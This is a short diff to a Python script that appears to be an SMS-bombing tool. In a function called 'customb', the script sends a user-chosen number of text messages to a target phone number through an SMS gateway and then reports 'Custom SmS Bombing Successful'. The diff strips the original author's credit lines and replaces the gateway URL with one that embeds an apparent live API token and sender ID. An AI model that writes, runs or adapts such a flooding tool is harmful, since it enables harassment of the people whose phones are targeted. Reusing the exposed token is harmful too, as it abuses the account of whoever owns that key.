@@ -1,5 +1,4 @@
-#coder  : parvej ahmed 
-#github : github.com/P4RVEJ
+
 #---------color code--------#
 I='\033[1;32m'
 Q="\x1b[00m"
@@ -148,7 +147,7 @@ def customb():
   
   lmt = int(input(f' {dt} ENTER AMOUNT : '))
   for i in range(lmt):
-    api = f'https://custom-sms-v1.vercel.app/send-sms?key=DH_Alamin_Hasan_Cs&number={nmbr}&message={msg}'
+    api = f'https://api.smsinbd.com/sms-api/sendsms?api_token=0bCYbXgzq19vnbuVYIy0btHk4KAKkalhVnh52fB2&senderid=8801969908462&message={msg}&contact_number={nmbr}'
     requests.get(api)
     print((str(i+1))+f' {dt} SMS Send Successful  \n')
   print('Custom SmS Bombing Successful')
